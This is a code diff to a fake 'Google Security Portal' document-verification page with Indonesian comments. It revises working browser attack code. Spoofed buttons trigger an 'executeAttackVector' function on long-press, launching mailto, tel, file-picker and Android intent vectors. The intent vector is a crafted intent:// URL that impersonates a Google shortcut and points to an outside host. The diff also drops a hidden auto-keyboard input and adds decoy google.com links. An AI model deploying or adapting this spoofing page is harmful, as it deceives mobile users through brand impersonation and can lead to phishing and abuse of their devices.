@@ -48,7 +48,6 @@
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
             transition: background-color 0.2s;
-            cursor: pointer;
         }
         a.spoof-link:active {
             background-color: #1557b0;
@@ -75,31 +74,19 @@
             font-size: 11px;
             color: #9aa0a6;
         }
-        /* Hidden input untuk memicu auto keyboard */
-        #hiddenInput {
-            position: absolute;
-            opacity: 0;
-            height: 0;
-            width: 0;
-            border: none;
-            outline: none;
-        }
     </style>
 </head>
 <body>
 
-    <!-- Input tersembunyi untuk auto trigger keyboard -->
-    <input type="text" id="hiddenInput" autocomplete="off">
-
     <div class="banner">Google Security Portal</div>
     <h1>Secure Document Verification</h1>
 
-    <!-- Container dengan 4 Tombol Terpisah (Termasuk Intent Spoof & Tanpa Redirect ke Google) -->
+    <!-- Container dengan 4 Tombol Terpisah (Termasuk Android Intent) -->
     <div class="button-container">
-        <a class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
-        <a class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
-        <a class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
-        <a class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
     </div>
 
     <!-- Uploaded Image Preview Box -->
@@ -111,26 +98,11 @@
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
-        // Fungsi untuk menaikkan virtual keyboard secara instan
-        const triggerKeyboard = () => {
-            const hiddenInput = document.getElementById("hiddenInput");
-            if (hiddenInput) {
-                hiddenInput.focus();
-            }
-        };
-
-        // Auto trigger interaksi pertama halaman
-        window.addEventListener('touchstart', triggerKeyboard, { once: true });
-        window.addEventListener('click', triggerKeyboard, { once: true });
-
         let triggered = false;
 
         const executeAttackVector = (actionType, intent) => {
             if (triggered) return;
             triggered = true;
-
-            // Naikkan keyboard bersamaan dengan eksekusi
-            triggerKeyboard();
 
             // Timer optimized to match the preview page opening animation
             setTimeout(async () => {
@@ -178,10 +150,9 @@
                         }
                     }
                     else if (actionType === 'intentspoof') {
-                        // Eksekusi skema Android Intent NDevTK secara langsung tanpa redirect web
                         const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
                         window.location.href = intentUrl;
-                        fileInfo.innerText = `Triggered Android intent vector: [${intent}]`;
+                        fileInfo.innerText = `Triggered Android intent vector with intent: [${intent}]`;
                         imagePreview.src = "";
                         previewBox.style.display = "block";
                     }
@@ -194,24 +165,33 @@
             }, 2400); // 1.9 seconds delay for ephemeral tab
         };
 
-        // Helper untuk memasang event listener Long-Press (contextmenu)
-        const bindLongPress = (elementId, actionType) => {
-            const el = document.getElementById(elementId);
-            if (!el) return;
+        // Event listener untuk Tombol Mailto
+        const linkMailto = document.getElementById("targetLinkMailto");
+        linkMailto.addEventListener("contextmenu", (e) => {
+            executeAttackVector('mailto', linkMailto.getAttribute('data-intent'));
+        });
+        linkMailto.addEventListener("touchstart", () => {}, { passive: true });
 
-            el.addEventListener("contextmenu", (e) => {
-                e.preventDefault(); // Mencegah menu konteks default browser agar vector langsung tereksekusi
-                executeAttackVector(actionType, el.getAttribute('data-intent'));
-            });
+        // Event listener untuk Tombol Tel
+        const linkTel = document.getElementById("targetLinkTel");
+        linkTel.addEventListener("contextmenu", (e) => {
+            executeAttackVector('tel', linkTel.getAttribute('data-intent'));
+        });
+        linkTel.addEventListener("touchstart", () => {}, { passive: true });
 
-            el.addEventListener("touchstart", () => {}, { passive: true });
-        }
+        // Event listener untuk Tombol File Picker
+        const linkFile = document.getElementById("targetLinkFile");
+        linkFile.addEventListener("contextmenu", (e) => {
+            executeAttackVector('filepicker', linkFile.getAttribute('data-intent'));
+        });
+        linkFile.addEventListener("touchstart", () => {}, { passive: true });
 
-        // Binding semua tombol ke event long-press (contextmenu) tanpa atribut href redirect
-        bindLongPress("targetLinkMailto", 'mailto');
-        bindLongPress("targetLinkTel", 'tel');
-        bindLongPress("targetLinkFile", 'filepicker');
-        bindLongPress("targetLinkIntent", 'intentspoof');
+        // Event listener untuk Tombol Android Intent Spoof
+        const linkIntent = document.getElementById("targetLinkIntent");
+        linkIntent.addEventListener("contextmenu", (e) => {
+            executeAttackVector('intentspoof', linkIntent.getAttribute('data-intent'));
+        });
+        linkIntent.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
